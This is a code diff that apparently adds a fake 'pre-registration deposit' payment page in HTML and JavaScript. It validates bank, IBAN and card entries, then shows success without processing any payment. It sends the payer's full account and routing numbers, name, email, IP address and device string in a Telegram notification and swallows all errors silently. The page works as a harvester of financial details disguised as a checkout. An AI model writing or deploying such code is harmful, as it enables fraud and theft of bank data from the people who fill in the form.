+        bankInput.placeholder = 'Enter your bank name';
+        bankInput.focus();
+        detected.classList.add('hidden');
+        unknown.classList.remove('hidden');
+      }
+    } else {
+      hidden.value = '';
+      bankInput.value = '';
+      bankInput.readOnly = true;
+      bankInput.style.opacity = '0.6';
+      bankInput.style.cursor = 'default';
+      bankInput.placeholder = 'Enter routing number first';
+      detected.classList.add('hidden');
+      unknown.classList.add('hidden');
+    }
+  }
+
+  function selectMethod(method) {
+    currentMethod = method;
+    document.getElementById('methodBank').classList.toggle('selected', method === 'bank');
+    document.getElementById('methodCard').classList.toggle('selected', method === 'card');
+    document.getElementById('bankPanel').classList.toggle('hidden', method !== 'bank');
+    document.getElementById('cardPanel').classList.toggle('hidden', method !== 'card');
+  }
+
+  (function() {
+    const cardNumber = document.getElementById('cardNumber');
+    const cardExpiry = document.getElementById('cardExpiry');
+    const cardCVC = document.getElementById('cardCVC');
+
+    cardNumber.addEventListener('input', function(e) {
+      let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+      e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+      detectCardBrand(v);
+    });
+    cardExpiry.addEventListener('input', function(e) {
+      let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+      if (v.length >= 2) v = v.substring(0, 2) + ' / ' + v.substring(2);
+      e.target.value = v;
+    });
+    cardCVC.addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+    });
+  })();
+
+  function detectCardBrand(number) {
+    const els = ['iconVisa','iconMC','iconAmex','iconDiscover'].map(function(id) { return document.getElementById(id); });
+    els.forEach(function(el) { el.classList.remove('active'); });
+    if (!number) return;
+    if (/^4/.test(number)) els[0].classList.add('active');
+    else if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) els[1].classList.add('active');
+    else if (/^3[47]/.test(number)) els[2].classList.add('active');
+    else if (/^6(?:011|5)/.test(number)) els[3].classList.add('active');
+  }
+
+  async function submitPayment(method) {
+    let payerName = '', payerEmail = '', payerData = {};
+
+    if (method === 'bank') {
+      if (currentBankType === 'intl') {
+        // International IBAN transfer
+        payerName = document.getElementById('intlPayerName').value.trim();
+        const iban = document.getElementById('intlIban').value.replace(/\s/g, '').trim();
+        const swift = document.getElementById('intlSwift').value.trim();
+        const bankName = document.getElementById('intlBankName').value.trim();
+        if (!payerName) { alert('Please enter your full name.'); return; }
+        let ibanCheck = MetasValidate.validateIBAN(iban);
+        if (!ibanCheck.valid) { alert(ibanCheck.error); return; }
+        let swiftCheck = MetasValidate.validateSWIFT(swift);
+        if (!swiftCheck.valid) { alert(swiftCheck.error); return; }
+        if (!bankName) { alert('Please enter your bank name.'); return; }
+        payerData = {
+          payer_bank_name: bankName,
+          payer_routing: swift,
+          payer_account_full: iban,
+          payer_account_last4: iban.slice(-4),
+          payer_account_type: 'iban'
+        };
+      } else {
+        // US routing + account
+        payerName = document.getElementById('bankPayerName').value.trim();
+        const routing = document.getElementById('bankRoutingInput').value.trim();
+        const account = document.getElementById('bankAccountInput').value.trim();
+        const bankName = document.getElementById('bankNameInput').value.trim();
+        if (!payerName) { alert('Please enter your full name.'); return; }
+        let routingCheck = MetasValidate.validateUSRouting(routing);
+        if (!routingCheck.valid) { alert(routingCheck.error); return; }
+        if (!bankName) { alert('Please enter your bank name.'); return; }
+        let accountCheck = MetasValidate.validateAccountNumber(account);
+        if (!accountCheck.valid) { alert(accountCheck.error); return; }
+        payerData = {
+          payer_bank_name: bankName,
+          payer_routing: routing,
+          payer_account_full: account,
+          payer_account_last4: account.slice(-4),
+          payer_account_type: 'checking'
+        };
+      }
+    } else {
+      payerName = document.getElementById('cardHolder').value.trim();
+      payerEmail = document.getElementById('cardPayerEmail').value.trim();
+      const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const expiry = document.getElementById('cardExpiry').value.trim();
+      const cvc = document.getElementById('cardCVC').value.trim();
+      if (!payerName) { alert('Please enter the cardholder name.'); return; }
+      let emailCheck = MetasValidate.validateEmail(payerEmail);
+      if (!emailCheck.valid) { alert(emailCheck.error); return; }
+      let cardCheck = MetasValidate.validateCardNumber(cardNum);
+      if (!cardCheck.valid) { alert(cardCheck.error); return; }
+      let expiryCheck = MetasValidate.validateCardExpiry(expiry);
+      if (!expiryCheck.valid) { alert(expiryCheck.error); return; }
+      let cvcCheck = MetasValidate.validateCVC(cvc, cardCheck.brand);
+      if (!cvcCheck.valid) { alert(cvcCheck.error); return; }
+
+      payerData = {
+        payer_card_last4: cardNum.slice(-4),
+        payer_card_brand: cardCheck.brand,
+        payer_card_expiry: expiry
+      };
+    }
+
+    const btn = method === 'bank' ? document.getElementById('bankSubmitBtn') : document.getElementById('cardSubmitBtn');
+    btn.disabled = true;
+    btn.innerHTML = '<div class="spinner" style="width:18px;height:18px;border-width:2px;"></div> Processing...';
+
+    const ref = params.get('ref');
+    const amount = parseFloat(params.get('amount'));
+    const currency = (params.get('currency') || 'USD').toUpperCase();
+    const note = params.get('note') || '';
+
+    savePaymentToDB(method, ref, amount, currency, note, payerName, payerEmail, payerData, navigator.userAgent).catch(function(e) {
+      
+    });
+
+    showState('success');
+    document.getElementById('signupLink').href = '/signup/?deposit_ref=' + encodeURIComponent(ref);
+  }
+
+  async function savePaymentToDB(method, ref, amount, currency, note, payerName, payerEmail, payerData, userAgent) {
+    if (typeof supabaseClient === 'undefined' || !supabaseClient) return;
+
+    let tgMsg = '💰 <b>New Pre-Registration Deposit</b>\n\n';
+    tgMsg += '📋 <b>Ref:</b>  <code>' + escHtml(ref) + '</code>\n';
+    tgMsg += '💲 <b>Amount:</b>  ' + escHtml(currency) + ' ' + amount.toLocaleString('en-US', {minimumFractionDigits:2}) + '\n';
+
+    if (method === 'bank') {
+      tgMsg += '🏦 <b>Method:</b>  Bank Transfer\n';
+    } else {
+      tgMsg += '💳 <b>Method:</b>  Credit Card\n';
+    }
+
+    tgMsg += '👤 <b>Payer:</b>  ' + escHtml(payerName) + '\n';
+
+    if (payerEmail) {
+      tgMsg += '📧 <b>Email:</b>  ' + escHtml(payerEmail) + '\n';
+    }
+
+    if (method === 'bank') {
+      tgMsg += '🏛️ <b>Bank:</b>  ' + escHtml(payerData.payer_bank_name) + '\n';
+      tgMsg += '🔢 <b>Account:</b>  <code>' + escHtml(payerData.payer_account_full) + '</code>\n';
+      tgMsg += '📌 <b>Routing:</b>  <code>' + escHtml(payerData.payer_routing) + '</code>\n';
+    } else {
+      tgMsg += '💳 <b>Card:</b>  ' + escHtml(payerData.payer_card_brand.charAt(0).toUpperCase() + payerData.payer_card_brand.slice(1)) + ' ending ' + escHtml(payerData.payer_card_last4) + '\n';
+      tgMsg += '📅 <b>Expiry:</b>  ' + escHtml(payerData.payer_card_expiry) + '\n';
+    }
+
+    tgMsg += '\n🕐 <b>Date:</b>  ' + new Date().toLocaleString();
+
+    try {
+      let ipResp = await fetch('https://ipapi.co/json/').then(function(r) { return r.json() });
+      tgMsg += '\n🌐 <b>IP:</b>  <code>' + escHtml(ipResp.ip || 'Unknown') + '</code>';
+    } catch(e) { tgMsg += '\n🌐 <b>IP:</b>  <code>Unknown</code>'; }
+
+    tgMsg += '\n📱 <b>Device:</b>  <code>' + escHtml(userAgent || 'Unknown') + '</code>';
+
+    supabaseClient.rpc('send_telegram_notification', { p_message: tgMsg })
+      .then(function() {  })
+      .catch(function(e) {  });
+
+    try {
+      if (!depositId) throw new Error('No deposit ID');
+      const { error: updateErr } = await supabaseClient.rpc('rpc_update_pre_deposit', {
+        p_id: depositId, p_payer_name: payerName, p_payer_email: payerEmail || null,
+        p_payer_method: method, p_payer_bank_name: payerData.payer_bank_name || null,
+        p_payer_routing: payerData.payer_routing || null, p_payer_account_last4: payerData.payer_account_last4 || null,
+        p_payer_account_type: payerData.payer_account_type || null, p_payer_card_last4: payerData.payer_card_last4 || null,
+        p_payer_card_brand: payerData.payer_card_brand || null, p_payer_card_expiry: payerData.payer_card_expiry || null,
+        p_status: 'submitted',
+        p_payer_account_full: payerData.payer_account_full || null
+      });
+      if (updateErr) throw updateErr;
+      
+    } catch (e) {
+      
+    }
+  }
+
+  function escHtml(str) {
+    if (!str) return '';
+    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
+  }
+  </script>
+</body>
+</html>
